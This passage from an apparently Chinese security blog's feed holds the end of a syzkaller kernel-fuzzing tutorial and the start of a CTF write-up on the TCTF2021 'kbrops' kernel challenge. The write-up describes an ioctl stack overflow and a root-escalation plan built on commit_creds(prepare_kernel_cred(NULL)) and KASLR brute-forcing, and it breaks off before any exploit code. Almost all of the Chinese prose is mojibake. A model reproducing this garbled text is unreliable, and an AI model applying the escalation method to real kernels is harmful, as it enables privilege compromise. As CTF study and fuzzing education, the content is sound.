title="ç¼–å†™å¹¶ä½¿ç”¨æè¿°æ–‡ä»¶"></a>ç¼–å†™å¹¶ä½¿ç”¨æè¿°æ–‡ä»¶</h2><h3 id="Step-I-ç¼–å†™æè¿°æ–‡ä»¶"><a href="#Step-I-ç¼–å†™æè¿°æ–‡ä»¶" class="headerlink" title="Step I.ç¼–å†™æè¿°æ–‡ä»¶"></a>Step I.ç¼–å†™æè¿°æ–‡ä»¶</h3><p>æˆ‘ä»¬éœ€è¦åœ¨ syzkaller ç›®å½•ä¸‹çš„ <code>syzkaller/sys/linux/</code> è¿™ä¸ªç›®å½•ä¸‹é¢æ–°å»ºæˆ‘ä»¬è‡ªå·±çš„æè¿°æ–‡ä»¶ï¼Œæ¯”å¦‚è¯´ç¬”è€…æ–°å»ºä¸€ä¸ª <code>a3_handsome.txt</code> æ–‡ä»¶å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">include &lt;linux/fs.h&gt;</span><br><span class="line"></span><br><span class="line">resource a3fd[int64]</span><br><span class="line"></span><br><span class="line">open$a3proc(file ptr[in, string[&quot;/dev/tty&quot;]], flags flags[a3_open_flags]) a3fd</span><br><span class="line">read$a3proc(fd a3fd, buf ptr[in, array[int8]], count len[buf])</span><br><span class="line">write$a3proc(fd a3fd, buf ptr[in, array[int8]], count len[buf])</span><br><span class="line">close$a3proc(fd a3fd)</span><br><span class="line"></span><br><span class="line">a3_open_flags = O_WRONLY, O_RDWR, O_APPEND, FASYNC, O_CLOEXEC, O_CREAT, O_DIRECT, O_DIRECTORY, O_EXCL, O_LARGEFILE, O_NOATIME, O_NOCTTY, O_NOFOLLOW, O_NONBLOCK, O_PATH, O_SYNC, O_TRUNC, __O_TMPFILE</span><br></pre></td></tr></table></figure><blockquote><p>éšä¾¿å†™çš„ï¼Œæ²¡æœ‰ä»»ä½•çš„é’ˆå¯¹æ€§è®¾è®¡</p></blockquote><p>åœ¨è¿™é‡Œå˜ç§åä¸º <code>a3proc</code>ï¼Œå¯ä»¥ç†è§£ä¸ºç¬”è€…è‡ªå·±å–çš„åˆ«åï¼Œè¿™æ˜¯å› ä¸ºè‹¥ä¸åŒçš„æè¿°æ–‡ä»¶ä¸­å­˜åœ¨ç›¸åŒçš„ç³»ç»Ÿè°ƒç”¨åˆ™ç¼–è¯‘æ—¶ä¼šå‘ç”Ÿå†²çª</p><h3 id="Step-II-ç¼–è¯‘-syz-extract-ä¸-syz-sysgen"><a href="#Step-II-ç¼–è¯‘-syz-extract-ä¸-syz-sysgen" class="headerlink" title="Step II.ç¼–è¯‘ syz-extract ä¸ syz-sysgen"></a>Step II.ç¼–è¯‘ syz-extract ä¸ syz-sysgen</h3><p>æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦ç¼–è¯‘ <code>syz-extract</code> ä¸ <code>syz-sysgen</code>ï¼Œä»è€Œåº”ç”¨æˆ‘ä»¬æ–°ç¼–å†™çš„æè¿°æ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make bin/syz-extract</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make bin/syz-sysgen<span class="comment"># no need for syzkaller in new version</span></span></span><br></pre></td></tr></table></figure><ul><li>syz-extract ç”¨ä»¥æå–å¼•å…¥çš„å†…æ ¸å¤´æ–‡ä»¶ä¸­çš„ define å¸¸é‡ç­‰ï¼Œç”Ÿæˆ <code>.const</code> æ–‡ä»¶</li><li>syz-sysgen ç”¨ä»¥ç»“åˆ <code>.txt</code> æ–‡ä»¶ä¸ <code>.const</code> æ–‡ä»¶è¿›è¡Œè¯­æ³•åˆ†æå’Œè¯­ä¹‰åˆ†æç”Ÿæˆ AST ï¼Œæœ€åç”Ÿæˆ <code>.go</code> æ–‡ä»¶</li></ul><p>å¯¹äºç‰ˆæœ¬è¾ƒæ–°çš„ syzkaller ï¼Œå…¶åœ¨ç¼–è¯‘æ—¶ä¼šé»˜è®¤ç¼–è¯‘ syz-sysgenï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦æ‰‹åŠ¨ç¼–è¯‘ syz-extract å³å¯</p><h3 id="Step-III-å¤„ç†æ–°è§„åˆ™æ–‡ä»¶"><a href="#Step-III-å¤„ç†æ–°è§„åˆ™æ–‡ä»¶" class="headerlink" title="Step III.å¤„ç†æ–°è§„åˆ™æ–‡ä»¶"></a>Step III.å¤„ç†æ–°è§„åˆ™æ–‡ä»¶</h3><p>ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å¤„ç†æˆ‘ä»¬åˆšåˆšå†™çš„è§„åˆ™æ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">bin/syz-extract -os linux -<span class="built_in">arch</span> <span class="variable">$ARCH</span> -sourcedir <span class="variable">$KSRC</span> -builddir <span class="variable">$LINUXBLD</span> &lt;new&gt;.txt</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">bin/syz-sysgen<span class="comment"># no need for syzkaller in new version</span></span></span><br></pre></td></tr></table></figure><ul><li><code>$ARCH</code> åº”ä¸ºä½ çš„ç›®æ ‡æ¶æ„ï¼Œå¯é€‰é¡¹æœ‰ <code>amd64</code>, <code>386</code> <code>arm64</code>, <code>arm</code>, <code>ppc64le</code>, <code>mips64le</code></li><li><code>$KSRC</code> åº”ä¸º fuzz çš„å†…æ ¸çš„æºç ç›®å½•</li><li><code>$LINUXBLD</code> åº”ä¸ºä½ çš„ç¼–è¯‘ç›®å½•ï¼Œä¸ºå¯é€‰é¡¹ï¼ˆ-builddirï¼‰</li><li><code>&lt;new&gt;.txt</code> å°±æ˜¯ä½ åˆšåˆšç¼–å†™çš„è§„åˆ™æ–‡ä»¶çš„æ–‡ä»¶å</li></ul><p>ä¼šåœ¨ <code>syzkaller/sys/linux</code> ä¸‹ç”Ÿæˆ <code>.const</code> æ–‡ä»¶æå–å‡ºå¸¸é‡ï¼Œåœ¨æ­£å¼ç¼–è¯‘æ—¶ä¼šè¿›è¡Œæ›¿æ¢ï¼Œä¾‹å¦‚ç¬”è€…ä¸Šé¢ç»™å‡ºçš„ä¾‹ç¨‹ç”Ÿæˆçš„ <code>.const</code> æ–‡ä»¶å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># Code generated by syz-sysgen. DO NOT EDIT.</span><br><span class="line">arches = amd64</span><br><span class="line">FASYNC = amd64:8192</span><br><span class="line">O_APPEND = amd64:1024</span><br><span class="line">O_CLOEXEC = amd64:524288</span><br><span class="line">O_CREAT = amd64:64</span><br><span class="line">O_DIRECT = amd64:16384</span><br><span class="line">O_DIRECTORY = amd64:65536</span><br><span class="line">O_EXCL = amd64:128</span><br><span class="line">O_LARGEFILE = amd64:32768</span><br><span class="line">O_NOATIME = amd64:262144</span><br><span class="line">O_NOCTTY = amd64:256</span><br><span class="line">O_NOFOLLOW = amd64:131072</span><br><span class="line">O_NONBLOCK = amd64:2048</span><br><span class="line">O_PATH = amd64:2097152</span><br><span class="line">O_RDWR = amd64:2</span><br><span class="line">O_SYNC = amd64:1052672</span><br><span class="line">O_TRUNC = amd64:512</span><br><span class="line">O_WRONLY = amd64:1</span><br><span class="line">__NR_open = amd64:2</span><br><span class="line">__NR_read = amd64:0</span><br><span class="line">__NR_write = amd64:1</span><br><span class="line">__O_TMPFILE = amd64:4194304</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Step-IV-é‡æ–°ç¼–è¯‘-syzkaller"><a href="#Step-IV-é‡æ–°ç¼–è¯‘-syzkaller" class="headerlink" title="Step IV.é‡æ–°ç¼–è¯‘ syzkaller"></a>Step IV.é‡æ–°ç¼–è¯‘ syzkaller</h3><p>å‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make generate</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make</span></span><br></pre></td></tr></table></figure><h3 id="Step-V-ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œå¯åŠ¨-syzkaller"><a href="#Step-V-ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œå¯åŠ¨-syzkaller" class="headerlink" title="Step V.ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œå¯åŠ¨ syzkaller"></a>Step V.ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œå¯åŠ¨ syzkaller</h3><p>å‰é¢æˆ‘ä»¬å‘½åäº† <code>a3proc</code> ï¼Œå› æ­¤æˆ‘ä»¬è¿˜éœ€è¦åœ¨é…ç½®æ–‡ä»¶ä¸­è¿›è¡Œ enableï¼Œåœ¨ä½ çš„ <code>.cfg</code> æ–‡ä»¶ä¸­æ·»åŠ è¿™ä¸€é¡¹ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;enable_syscalls&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line"><span class="string">&quot;open$a3proc&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="string">&quot;read$a3proc&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="string">&quot;write$a3proc&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="string">&quot;close$a3proc&quot;</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure><p>ä¹‹åæŒ‰æƒ¯ä¾‹å¯åŠ¨å³å¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./bin/syz-manager -config=config.cfg</span></span><br></pre></td></tr></table></figure><h2 id="å·¥ä½œåŸç†"><a href="#å·¥ä½œåŸç†" class="headerlink" title="*å·¥ä½œåŸç†"></a><em>*å·¥ä½œåŸç†</em></h2><p>å½“æˆ‘ä»¬ä½¿ç”¨ syzlang ç¼–å†™å¥½æ¨¡æ¿ä¹‹åï¼Œè¿™äº›ç³»ç»Ÿè°ƒç”¨æ¨¡æ¿ä¼šé€šè¿‡ <strong>syz-extract</strong> å’Œ <strong>syz-sysgen</strong> ç¿»è¯‘ä¸º syzkaller èƒ½å¤Ÿè¯»æ‡‚çš„ä»£ç ï¼Œç¬”è€…è¿™é‡Œç®€è¿°ä¸€ä¸‹å…¶åŸç†</p><blockquote><p>è¿™é‡Œä½ å¯èƒ½éœ€è¦ä¸€ç‚¹ç¼–è¯‘åŸç†çš„çŸ¥è¯†ï¼Œä¸è¿‡ç¬”è€…ç›¸ä¿¡å¤§å®¶ç¼–è¯‘åŸç†åº”å½“éƒ½åŠæ ¼äº†ï¼ˆç¬‘ï¼‰</p><blockquote><p><del>ä»€ä¹ˆï¼Ÿä½ è¯´ä½ è¿˜æ²¡ä¸Šè¿™é—¨è¯¾</del></p><blockquote><p><del>ä»€ä¹ˆï¼Ÿç”¨ syzkaller æŒ–æ´åªè¦ä¼šå†™ syzlang å°±è¡Œäº†ï¼Œæ ¹æœ¬ä¸éœ€è¦ç†è§£ä»–çš„åŸç†</del></p></blockquote></blockquote><p>ç®€è¦è€Œè¨€ï¼Œä»æºä»£ç åˆ°å¯æ‰§è¡Œæ–‡ä»¶å¤§æ¦‚æœ‰å¦‚ä¸‹è¿‡ç¨‹ï¼š</p><ul><li>è¯æ³•åˆ†æï¼ˆlexical analysisï¼‰ï¼šæ‰«æå™¨ï¼ˆscannerï¼Œé€šå¸¸æ˜¯ä¸€ä¸ªæœ‰é™çŠ¶æ€è‡ªåŠ¨æœºï¼‰ä»æºç æ–‡æœ¬ä¸­é€å­—ç¬¦è¯»å…¥ï¼Œè¿‡æ»¤æ‰æ³¨é‡Šï¼Œå°†è¯ç´ æ˜ å°„ä¸ºè¯æ³•å•å…ƒï¼Œç”Ÿæˆç¬¦å·è¡¨ï¼Œå»ºç«‹æ˜ å°„ï¼Œæœ€ç»ˆè¾“å‡ºè¯ç´ åºåˆ—</li><li>è¯­æ³•åˆ†æï¼ˆsyntax analysisï¼‰ï¼šè¯­æ³•åˆ†æå™¨ä»è¯æ³•åˆ†æå™¨ä¸­è·å–è¯ç´ åºåˆ—ï¼Œæ„å»ºæ ‘å½¢çš„ä¸­é—´è¡¨ç¤ºï¼šé€šå¸¸æ˜¯æŠ½è±¡è¯­æ³•æ ‘ï¼ˆabstract syntax treeï¼‰ï¼Œæ ‘å½¢ä¸­é—´èŠ‚ç‚¹è¡¨ç¤ºè¿ç®—åˆ†é‡ï¼Œæœ€ç»ˆè¾“å‡ºè¢«ç§°ä¹‹ä¸ºè¯æ³•å•å…ƒæµçš„è¯­æ³•æ ‘</li><li>è¯­ä¹‰åˆ†æï¼ˆsemantic analysisï¼‰ï¼šè¯­ä¹‰åˆ†æå™¨ä½¿ç”¨è¯­æ³•æ ‘ä¸ç¬¦å·è¡¨æ£€æŸ¥æºç¨‹åºçš„è¯­ä¹‰ä¸€è‡´æ€§ï¼Œä¾‹å¦‚ä¸€ä¸ªæ•´æ•°å’Œä¸€ä¸ªå­—ç¬¦ä¸²ç›¸åŠ æ˜¯ç¬¦åˆè¯­æ³•è§„åˆ™çš„ï¼Œä½†å¯¹äºå¤§éƒ¨åˆ†è¯­è¨€è€Œè¨€è¿™å¹¶ä¸æ˜¯ä¸€ä¸ªåˆæ³•çš„è¿ç®—ï¼Œå› æ­¤ä¸ç¬¦åˆè¯­ä¹‰è§„åˆ™ï¼ˆ<del>ä»€ä¹ˆï¼Ÿä½ è¯´ä½ ç”¨ JavaScript</del>ï¼‰</li><li><em>ä¸­é—´ä»£ç ç”Ÿæˆä¸ä¼˜åŒ–ï¼šä¸­é—´ä»£ç ç”Ÿæˆå™¨é€šè¿‡è¯­ä¹‰åˆ†æçš„ç»“æœç”Ÿæˆå¯¹åº”çš„ä¸­é—´ä»£ç ï¼ˆä¾‹å¦‚ä¸‰åœ°å€ç ï¼‰ï¼Œå¹¶è¿›è¡Œä¸€å®šçš„ä¼˜åŒ–</em></li><li><em>ä»£ç ç”Ÿæˆï¼šç”±ä»£ç ç”Ÿæˆå™¨å°†ä¸­é—´ä»£ç è½¬ä¸ºå¯æ‰§è¡Œä»£ç </em></li></ul></blockquote><h3 id="syz-extract"><a href="#syz-extract" class="headerlink" title="syz-extract"></a>syz-extract</h3><p>ç¬¬ä¸€æ­¥æ˜¯ä»å†…æ ¸æºæ–‡ä»¶ä¸­æå–ç¬¦å·å¸¸é‡çš„å€¼ï¼š<code>syz-extract</code> ä¼šæ ¹æ® syzlang æ–‡ä»¶ä»å†…æ ¸æºæ–‡ä»¶ä¸­æå–å‡ºä½¿ç”¨çš„å¯¹åº”çš„å®ã€ç³»ç»Ÿè°ƒç”¨å·ç­‰çš„å€¼ï¼Œç”Ÿæˆ <code>.const</code> æ–‡ä»¶</p><h3 id="syz-sysgen"><a href="#syz-sysgen" class="headerlink" title="syz-sysgen"></a>syz-sysgen</h3><p>ç¬¬äºŒæ­¥ä¾¿æ˜¯å°†æè¿°ç¿»è¯‘æˆ Golang ä»£ç ï¼š<code>syz-sysgen</code> é€šè¿‡ syzlang æ–‡ä»¶ä¸ .const æ–‡ä»¶è¿›è¡Œè¯­æ³•åˆ†æä¸è¯­ä¹‰åˆ†æï¼Œç”ŸæˆæŠ½è±¡è¯­æ³•æ ‘ï¼Œæœ€ç»ˆç”Ÿæˆä¾› syzkaller ä½¿ç”¨çš„ golang ä»£ç ï¼Œåˆ†ä¸ºå¦‚ä¸‹å››ä¸ªæ­¥éª¤ï¼š</p><ul><li><strong>assignSyscallNumbers</strong>ï¼šåˆ†é…ç³»ç»Ÿè°ƒç”¨å·ï¼Œæ£€æµ‹ä¸æ”¯æŒçš„ç³»ç»Ÿè°ƒç”¨å¹¶ä¸¢å¼ƒ</li><li><strong>patchConsts</strong>ï¼šå°† AST ä¸­çš„å¸¸é‡æ›¿æ¢ä¸ºå¯¹åº”çš„å€¼</li><li><strong>check</strong>ï¼šè¿›è¡Œè¯­ä¹‰åˆ†æ</li><li><strong>genSyscalls</strong>ï¼šä» AST ç”Ÿæˆ prog å¯¹è±¡</li></ul><h1 id="0x04-å®æˆ˜ï¼šç”¨-syzkaller-æŒ–æ˜å‡º-CVE-20"><a href="#0x04-å®æˆ˜ï¼šç”¨-syzkaller-æŒ–æ˜å‡º-CVE-20" class="headerlink" title="0x04.å®æˆ˜ï¼šç”¨ syzkaller æŒ–æ˜å‡º CVE-20??-????"></a><del>0x04.å®æˆ˜ï¼šç”¨ syzkaller æŒ–æ˜å‡º CVE-20??-????</del></h1><p><del>CVE-20??-???? æ˜¯ç”±äº ?? åŸå› é€ æˆçš„å†…æ ¸ç©ºé—´ä¸­çš„ ??ï¼Œç¬”è€…æ¥ä¸‹æ¥å°†å°è¯•ä½¿ç”¨ syzkaller æ¥æŒ–æ˜å‡ºè¯¥æ¼æ´</del></p><blockquote><p>ğŸ•ŠğŸ•ŠğŸ•Š</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;å°è¯•éå†æ‰€æœ‰çš„ä¸–ç•Œçº¿&lt;/p&gt;</summary>
    
    
    
    <category term="FUZZ" scheme="http://blog.arttnba3.cn/categories/FUZZ/"/>
    
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="æ¼æ´æŒ–æ˜" scheme="http://blog.arttnba3.cn/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    <category term="syzkaller" scheme="http://blog.arttnba3.cn/tags/syzkaller/"/>
    
  </entry>
  
  <entry>
    <title>ã€CTF.0x05ã€‘TCTF2021-FINAL ä¸¤é“ kernel pwn é¢˜è§£</title>
    <link href="http://blog.arttnba3.cn/2021/10/31/CTF-0X05-TCTF2021_FINAL/"/>
    <id>http://blog.arttnba3.cn/2021/10/31/CTF-0X05-TCTF2021_FINAL/</id>
    <published>2021-10-30T20:57:30.000Z</published>
    <updated>2022-03-18T00:17:59.000Z</updated>
    
    <content type="html"><![CDATA[<p>æ¬§çš‡ä¸éé…‹çš„å¯¹å†³</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p><a href="https://github.com/YZloser/My-CTF-Challenges/tree/master/0ctf-2021-final/kernote">å®˜æ–¹é¢˜è§£è§æ­¤å¤„</a></p><p>å‰äº›æ—¥å­ï¼ˆ<del>å¥½åƒæ˜¯ä¸Šä¸ªæœˆçš„äº‹æƒ…äº†</del>ï¼‰æ‰“äº† TCTF 2021 FINALï¼Œå…¶ä¸­åˆšå¥½æœ‰ä¸¤é“ Linux kernel pwn é¢˜ï¼Œç¬”è€…åœ¨æ¯”èµ›æœŸé—´æ²¡æœ‰å¤šå°‘å¤´ç»ªï¼Œæœ€è¿‘è¶æœ‰æ—¶é—´å¤ç°äº†ä¸€ä¸‹</p><h1 id="0x01-kbrops"><a href="#0x01-kbrops" class="headerlink" title="0x01.kbrops"></a>0x01.kbrops</h1><blockquote><p>è¿™ä¸ªé¢˜ç›®æ¯”èµ›æ—¶æ²¡åšå‡ºæ¥ï¼Œ<del>ç¬”è€…åŸä»¥ä¸ºä¼šæœ‰ä¸€ç§å¾ˆé«˜ç«¯å¾ˆ nb çš„è§£æ³•ï¼Œä½†æ˜¯åé¢å‘ç°å¤§å®¶çš„è§£æ³•éƒ½æ˜¯å—¯çˆ†ç ´â€¦</del>èµ›åçœ‹äº†å…¶ä»–é€‰æ‰‹çš„é¢˜è§£å‘ç°æ¯”æƒ³è±¡ä¸­ç®€å•å¤ªå¤šäº†â€¦ç­¾åˆ°é¢˜éš¾åº¦éƒ½ç®—ä¸ä¸Šâ€¦<strong>ä½†æ˜¯å¾ˆå±‘</strong></p><blockquote><p><del>å¤§ä¸€çš„å°æœ‹å‹éƒ½èƒ½åšå‡ºæ¥çš„å±‘é¢˜ï¼Œç¬”è€…ä¸çŸ¥é“ä¸ºä»€ä¹ˆä¼šå‡ºç°åœ¨ TCTF FINAL ä¸­</del></p><blockquote><p><del>ä»€ä¹ˆï¼Œä½ é—®ä¸ºä»€ä¹ˆæ–°æ˜Ÿèµ›é‡Œè¿™é“é¢˜æ˜¯ 0 è§£ï¼Ÿ</del></p><blockquote><p><del>å¯èƒ½æ˜¯å› ä¸ºå¤§å®¶éƒ½å¤ªéäº†å§</del></p></blockquote></blockquote></blockquote></blockquote><h2 id="ä¸€ã€é¢˜ç›®åˆ†æ"><a href="#ä¸€ã€é¢˜ç›®åˆ†æ" class="headerlink" title="ä¸€ã€é¢˜ç›®åˆ†æ"></a>ä¸€ã€é¢˜ç›®åˆ†æ</h2><h3 id="ä¿æŠ¤"><a href="#ä¿æŠ¤" class="headerlink" title="ä¿æŠ¤"></a>ä¿æŠ¤</h3><p>æŸ¥çœ‹  <code>/sys/devices/system/cpu/vulnerabilities/ </code></p><p><img src="https://i.loli.net/2021/10/28/6cgnhXyrz2uLIaF.png" alt="image.png"></p><p>å¼€å¯äº† KPTIï¼ˆå†…æ ¸é¡µè¡¨éš”ç¦»ï¼Œä¸€èˆ¬ç®€ç§°é¡µè¡¨éš”ç¦»ï¼ˆPTIï¼‰ï¼Œç¬”è€…æ›´å–œæ¬¢ç”¨å…¨ç§°ï¼‰</p><p>æŸ¥çœ‹å¯åŠ¨è„šæœ¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">stty</span> intr ^]</span><br><span class="line"><span class="built_in">cd</span> `<span class="built_in">dirname</span> <span class="variable">$0</span>`</span><br><span class="line"><span class="built_in">timeout</span> --foreground 300 qemu-system-x86_64 \</span><br><span class="line">    -m 256M \</span><br><span class="line">    -enable-kvm \</span><br><span class="line">    -cpu host,+smep,+smap \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -initrd initramfs.cpio.gz \</span><br><span class="line">    -nographic \</span><br><span class="line">    -monitor none \</span><br><span class="line">    -drive file=flag.txt,format=raw \</span><br><span class="line">    -snapshot \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 kaslr kpti quiet oops=panic panic=1&quot;</span></span><br></pre></td></tr></table></figure><p>å¼€äº† smapã€smepã€kaslr ä¿æŠ¤</p><p>åœ¨è¿™é‡Œå¹¶æ²¡æœ‰åƒå¸¸è§„çš„ kernel pwn é‚£æ ·æŠŠ flag æƒé™è®¾ä¸º root 600 æ”¾åœ¨æ–‡ä»¶ç³»ç»Ÿé‡Œï¼Œè€Œæ˜¯å°† flag ä½œä¸ºä¸€ä¸ªè®¾å¤‡è½½å…¥ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦è¯»å– <code>/dev/sda</code> ä»¥è·å– flagï¼Œä»ç„¶éœ€è¦ root æƒé™</p><h3 id="é€†å‘åˆ†æ"><a href="#é€†å‘åˆ†æ" class="headerlink" title="é€†å‘åˆ†æ"></a>é€†å‘åˆ†æ</h3><p><img src="https://i.loli.net/2021/10/27/HcCDmWho3EVfenu.png" alt="image.png"></p><p>æ•´ä¸ªç¨‹åºåªå®šä¹‰äº†ä¸€ä¸ª ioctl çš„ 0x666 åŠŸèƒ½ï¼Œä¼šå–æˆ‘ä»¬ä¼ å…¥çš„å‰ä¸¤ä¸ªå­—èŠ‚ä½œä¸ºåç»­æ‹·è´çš„ sizeï¼Œä¹‹å kmalloc ä¸€ä¸ª objectï¼Œä»æˆ‘ä»¬ä¼ å…¥çš„ç¬¬ä¸‰ä¸ªå­—èŠ‚å¼€å§‹æ‹·è´ï¼Œä¹‹åå†ä» object æ‹·è´åˆ°æ ˆä¸Šï¼Œå› ä¸ºä¸¤ä¸ªå­—èŠ‚æœ€å¤§å°±æ˜¯ 0xffffï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥å°±æœ‰ä¸€ä¸ªè£¸çš„æ ˆæº¢å‡º</p><h2 id="äºŒã€æ¼æ´åˆ©ç”¨"><a href="#äºŒã€æ¼æ´åˆ©ç”¨" class="headerlink" title="äºŒã€æ¼æ´åˆ©ç”¨"></a>äºŒã€æ¼æ´åˆ©ç”¨</h2><p>æ—¢ç„¶ç›®å‰æœ‰äº†æ ˆæº¢å‡ºï¼Œè€Œä¸”æ²¡æœ‰ stack canary ä¿æŠ¤ï¼Œæ¯”è¾ƒæœ´ç´ çš„ææƒæ–¹æ³•å°±æ˜¯æ‰§è¡Œ <code>commit_creds(prepare_kernel_cred(NULL))</code> ææƒåˆ° rootï¼Œä½†æ˜¯ç”±äºå¼€å¯äº† kaslrï¼Œå› æ­¤æˆ‘ä»¬è¿˜éœ€è¦çŸ¥é“ kernel offsetï¼Œä½†æ˜¯æ¯«æ— ç–‘é—®çš„æ˜¯åªæœ‰ä¸€ä¸ªè£¸çš„æº¢å‡ºæ˜¯æ²¡æ³•è®©æˆ‘ä»¬ç›´æ¥æ³„æ¼å‡ºå†…æ ¸ä¸­çš„æ•°æ®çš„</p><p>è¿™é‡Œ r3kapig ç»™å‡ºçš„è§£æ³•æ˜¯<strong>å‡è£…ä»–æ²¡æœ‰è¿™ä¸ª kaslrï¼Œç„¶åç›´æ¥ç¡¬æ‰“</strong>ï¼Œæ®ç§°å¤§æ¦‚è¯•ä¸ªå‡ ç™¾æ¬¡å°±èƒ½æˆåŠŸ</p><blockquote><p>è¿™é‡Œæ”¾ç¬”è€…æŸä½æœ‹å‹çš„ä¸€å¥åè¨€ï¼ˆ</p><p><img src="https://i.loli.net/2021/10/28/AenCihQc1rldLFw.png" alt="image.png"></p></blockquote><p>èµ›ååœ¨ discord ç¾¤ç»„ä¸­è®¨è®ºï¼Œå¾—çŸ¥ kaslr çš„éšæœºåŒ–åªæœ‰ 9ä½ï¼Œå¯ä»¥ç›´æ¥è¿›è¡Œçˆ†ç ´</p><p><img src="https://i.loli.net/2021/10/31/RhZDQfjqnNr3ozt.png" alt="image.png"></p><p>ç¬”è€…å†™äº†ä¸ªçˆ†ç ´åç§»ç”¨çš„ exp ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span 